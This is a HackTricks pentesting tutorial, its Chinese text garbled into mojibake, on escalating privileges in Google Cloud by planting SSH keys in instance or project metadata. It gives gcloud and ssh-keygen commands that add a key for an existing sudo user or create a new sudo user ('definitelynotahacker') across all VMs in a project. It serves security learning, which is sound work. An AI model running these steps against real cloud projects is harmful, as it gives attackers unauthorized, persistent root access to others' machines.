# GCP - æ·»åŠ è‡ªå®šä¹‰SSHå…ƒæ•°æ®

{% hint style="success" %}
å­¦ä¹ å¹¶ç»ƒä¹ AWS Hackingï¼š<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricksåŸ¹è®­AWSçº¢é˜Ÿä¸“å®¶ï¼ˆARTEï¼‰**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
å­¦ä¹ å¹¶ç»ƒä¹ GCP Hackingï¼š<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricksåŸ¹è®­GCPçº¢é˜Ÿä¸“å®¶ï¼ˆGRTEï¼‰**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒHackTricks</summary>

* æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘ä»¬çš„**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* é€šè¿‡å‘[**HackTricks**](https://github.com/carlospolop/hacktricks)å’Œ[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}

## ä¿®æ”¹å…ƒæ•°æ® <a href="#modifying-the-metadata" id="modifying-the-metadata"></a>

å¦‚æœæ”»å‡»è€…è·å¾—å¿…è¦çš„æƒé™ï¼Œå®ä¾‹ä¸Šçš„å…ƒæ•°æ®ä¿®æ”¹å¯èƒ½ä¼šå¯¼è‡´**é‡å¤§å®‰å…¨é£é™©**ã€‚

### **å°†SSHå¯†é’¥åˆå¹¶åˆ°è‡ªå®šä¹‰å…ƒæ•°æ®ä¸­**

åœ¨GCPä¸Šï¼Œ**Linuxç³»ç»Ÿ**é€šå¸¸ä¼šä»[Google Compute Engineçš„Python Linux Guest Environment](https://github.com/GoogleCloudPlatform/compute-image-packages/tree/master/packages/python-google-compute-engine#accounts)æ‰§è¡Œè„šæœ¬ã€‚å…¶ä¸­ä¸€ä¸ªå…³é”®ç»„ä»¶æ˜¯[accountså®ˆæŠ¤ç¨‹åº](https://github.com/GoogleCloudPlatform/compute-image-packages/tree/master/packages/python-google-compute-engine#accounts)ï¼Œæ—¨åœ¨**å®šæœŸæ£€æŸ¥**å®ä¾‹å…ƒæ•°æ®ç«¯ç‚¹ï¼Œä»¥è·å–**æˆæƒçš„SSHå…¬é’¥çš„æ›´æ–°**ã€‚

å› æ­¤ï¼Œå¦‚æœæ”»å‡»è€…å¯ä»¥ä¿®æ”¹è‡ªå®šä¹‰å…ƒæ•°æ®ï¼Œä»–å¯ä»¥ä½¿å®ˆæŠ¤ç¨‹åºæ‰¾åˆ°ä¸€ä¸ªæ–°çš„å…¬é’¥ï¼Œè¯¥å…¬é’¥å°†è¢«å¤„ç†å¹¶**é›†æˆåˆ°æœ¬åœ°ç³»ç»Ÿ**ä¸­ã€‚è¯¥å¯†é’¥å°†è¢«æ·»åŠ åˆ°ç°æœ‰ç”¨æˆ·çš„`~/.ssh/authorized_keys`æ–‡ä»¶ä¸­ï¼Œæˆ–è€…æ ¹æ®å¯†é’¥çš„æ ¼å¼ï¼Œå¯èƒ½ä¼šåˆ›å»ºä¸€ä¸ªå…·æœ‰`sudo`æƒé™çš„æ–°ç”¨æˆ·ã€‚æ”»å‡»è€…å°†èƒ½å¤Ÿ compromise ä¸»æœºã€‚

### **å°†SSHå¯†é’¥æ·»åŠ åˆ°ç°æœ‰ç‰¹æƒç”¨æˆ·**

1. **æ£€æŸ¥å®ä¾‹ä¸Šç°æœ‰çš„SSHå¯†é’¥ï¼š**
- æ‰§è¡Œå‘½ä»¤æè¿°å®ä¾‹åŠå…¶å…ƒæ•°æ®ï¼Œä»¥æŸ¥æ‰¾ç°æœ‰çš„SSHå¯†é’¥ã€‚è¾“å‡ºä¸­çš„ç›¸å…³éƒ¨åˆ†å°†ä½äº`metadata`ä¸‹ï¼Œç‰¹åˆ«æ˜¯`ssh-keys`é”®ã€‚
```bash
gcloud compute instances describe [INSTANCE] --zone [ZONE]
```
- æ³¨æ„SSHå¯†é’¥çš„æ ¼å¼ï¼šç”¨æˆ·ååœ¨å†’å·ä¹‹å‰ï¼Œç”¨å†’å·åˆ†éš”ã€‚

2. **ä¸ºSSHå¯†é’¥å…ƒæ•°æ®å‡†å¤‡æ–‡æœ¬æ–‡ä»¶ï¼š**
- å°†ç”¨æˆ·ååŠå…¶å¯¹åº”çš„SSHå¯†é’¥è¯¦æƒ…ä¿å­˜åˆ°åä¸º`meta.txt`çš„æ–‡æœ¬æ–‡ä»¶ä¸­ã€‚è¿™å¯¹äºåœ¨æ·»åŠ æ–°å¯†é’¥æ—¶ä¿ç•™ç°æœ‰å¯†é’¥è‡³å…³é‡è¦ã€‚

3. **ä¸ºç›®æ ‡ç”¨æˆ·ï¼ˆæ­¤ç¤ºä¾‹ä¸­ä¸º`alice`ï¼‰ç”Ÿæˆæ–°çš„SSHå¯†é’¥ï¼š**
- ä½¿ç”¨`ssh-keygen`å‘½ä»¤ç”Ÿæˆæ–°çš„SSHå¯†é’¥ï¼Œç¡®ä¿æ³¨é‡Šå­—æ®µï¼ˆ`-C`ï¼‰ä¸ç›®æ ‡ç”¨æˆ·ååŒ¹é…ã€‚
```bash
ssh-keygen -t rsa -C "alice" -f ./key -P "" && cat ./key.pub
```
- å°†æ–°çš„å…¬é’¥æ·»åŠ åˆ°`meta.txt`ï¼Œæ¨¡ä»¿å®ä¾‹å…ƒæ•°æ®ä¸­æ‰¾åˆ°çš„æ ¼å¼ã€‚

4. **æ›´æ–°å®ä¾‹çš„SSHå¯†é’¥å…ƒæ•°æ®ï¼š**
- ä½¿ç”¨`gcloud compute instances add-metadata`å‘½ä»¤å°†æ›´æ–°åçš„SSHå¯†é’¥å…ƒæ•°æ®åº”ç”¨äºå®ä¾‹ã€‚
```bash
gcloud compute instances add-metadata [INSTANCE] --metadata-from-file ssh-keys=meta.txt
```

5. **ä½¿ç”¨æ–°çš„SSHå¯†é’¥è®¿é—®å®ä¾‹ï¼š**
- ä½¿ç”¨æ–°å¯†é’¥è¿æ¥åˆ°å®ä¾‹çš„SSHï¼Œä»¥åœ¨ç›®æ ‡ç”¨æˆ·ï¼ˆæ­¤ç¤ºä¾‹ä¸­ä¸º`alice`ï¼‰çš„ä¸Šä¸‹æ–‡ä¸­è®¿é—®shellã€‚
```bash
ssh -i ./key alice@localhost
sudo id
```

### **åˆ›å»ºä¸€ä¸ªæ–°çš„ç‰¹æƒç”¨æˆ·å¹¶æ·»åŠ SSHå¯†é’¥**

å¦‚æœæœªæ‰¾åˆ°æœ‰è¶£çš„ç”¨æˆ·ï¼Œå¯ä»¥åˆ›å»ºä¸€ä¸ªæ–°ç”¨æˆ·ï¼Œå¹¶èµ‹äºˆå…¶`sudo`æƒé™ï¼š
```bash
# define the new account username
NEWUSER="definitelynotahacker"

# create a key
ssh-keygen -t rsa -C "$NEWUSER" -f ./key -P ""

# create the input meta file
NEWKEY="$(cat ./key.pub)"
echo "$NEWUSER:$NEWKEY" > ./meta.txt

# update the instance metadata
gcloud compute instances add-metadata [INSTANCE_NAME] --metadata-from-file ssh-keys=meta.txt

# ssh to the new account
ssh -i ./key "$NEWUSER"@localhost
```
### é¡¹ç›®çº§åˆ«çš„SSHå¯†é’¥ <a href="#sshing-around" id="sshing-around"></a>

å¯ä»¥é€šè¿‡åœ¨**é¡¹ç›®çº§åˆ«åº”ç”¨SSHå¯†é’¥**æ¥æ‰©å¤§åœ¨äº‘ç¯å¢ƒä¸­å¯¹å¤šä¸ªè™šæ‹Ÿæœºï¼ˆVMsï¼‰çš„SSHè®¿é—®èŒƒå›´ã€‚è¿™ç§æ–¹æ³•å…è®¸å¯¹é¡¹ç›®ä¸­æœªæ˜ç¡®é˜»æ­¢é¡¹ç›®èŒƒå›´SSHå¯†é’¥çš„ä»»ä½•å®ä¾‹è¿›è¡ŒSSHè®¿é—®ã€‚ä»¥ä¸‹æ˜¯ä¸€ä¸ªç®€è¦æŒ‡å—ï¼š

1. **åœ¨é¡¹ç›®çº§åˆ«åº”ç”¨SSHå¯†é’¥ï¼š**
- ä½¿ç”¨`gcloud compute project-info add-metadata`å‘½ä»¤å°†`meta.txt`ä¸­çš„SSHå¯†é’¥æ·»åŠ åˆ°é¡¹ç›®çš„å…ƒæ•°æ®ä¸­ã€‚æ­¤æ“ä½œç¡®ä¿SSHå¯†é’¥åœ¨é¡¹ç›®ä¸­çš„æ‰€æœ‰VMä¸­è¢«è¯†åˆ«ï¼Œé™¤éæŸä¸ªVMå¯ç”¨äº†â€œé˜»æ­¢é¡¹ç›®èŒƒå›´SSHå¯†é’¥â€é€‰é¡¹ã€‚
```bash
gcloud compute project-info add-metadata --metadata-from-file ssh-keys=meta.txt
```

2. **ä½¿ç”¨é¡¹ç›®èŒƒå›´å¯†é’¥SSHè¿›å…¥å®ä¾‹ï¼š**
- æœ‰äº†é¡¹ç›®èŒƒå›´çš„SSHå¯†é’¥ï¼Œæ‚¨å¯ä»¥SSHè¿›å…¥é¡¹ç›®ä¸­çš„ä»»ä½•å®ä¾‹ã€‚æœªé˜»æ­¢é¡¹ç›®èŒƒå›´å¯†é’¥çš„å®ä¾‹å°†æ¥å—SSHå¯†é’¥ï¼Œä»è€Œæˆäºˆè®¿é—®æƒé™ã€‚
- ç›´æ¥SSHè¿›å…¥å®ä¾‹çš„æ–¹æ³•æ˜¯ä½¿ç”¨`gcloud compute ssh [INSTANCE]`å‘½ä»¤ã€‚æ­¤å‘½ä»¤ä½¿ç”¨æ‚¨å½“å‰çš„ç”¨æˆ·åå’Œåœ¨é¡¹ç›®çº§åˆ«è®¾ç½®çš„SSHå¯†é’¥æ¥å°è¯•è®¿é—®ã€‚


# å‚è€ƒ
* [https://about.gitlab.com/blog/2020/02/12/plundering-gcp-escalating-privileges-in-google-cloud-platform/](https://about.gitlab.com/blog/2020/02/12/plundering-gcp-escalating-privileges-in-google-cloud-platform/)
